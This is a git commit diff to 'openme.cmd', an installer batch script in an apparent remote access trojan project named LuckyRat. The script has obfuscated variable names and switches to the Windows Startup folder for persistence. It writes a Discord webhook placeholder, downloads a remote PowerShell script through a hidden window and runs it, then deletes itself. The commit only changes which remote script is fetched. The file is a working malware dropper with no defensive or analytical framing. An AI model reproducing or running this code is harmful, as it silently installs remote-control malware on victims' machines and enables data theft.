f31e8cdff6e8fecb879b297bd31e7ef7a95d197e
LuckyWares <k_ezer@hotmail.fr>
2025-07-13 08:06:21 +0100

    Update openme.cmd

--- Installer/openme.cmd
+++ Installer/openme.cmd
@@ -3,7 +3,7 @@ set "KjdmdFfSxt=%cd%"
 set "JhOgZZdxnKU=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 cd %JhOgZZdxnKU%
 echo DISCORDWEBHOOK > LoKHjdNA.txt
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/LuckyWares/LuckyRat/refs/heads/main/Installer/installer.ps1 -o KuhNdWeraxD.cmd"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/LuckyWares/LuckyRat/refs/heads/main/Installer/downloader.ps1 -o KuhNdWeraxD.cmd"
 powershell ./KuhNdWeraxD.cmd
 cd "%KjdmdFfSxt%"
 del openme.cmd
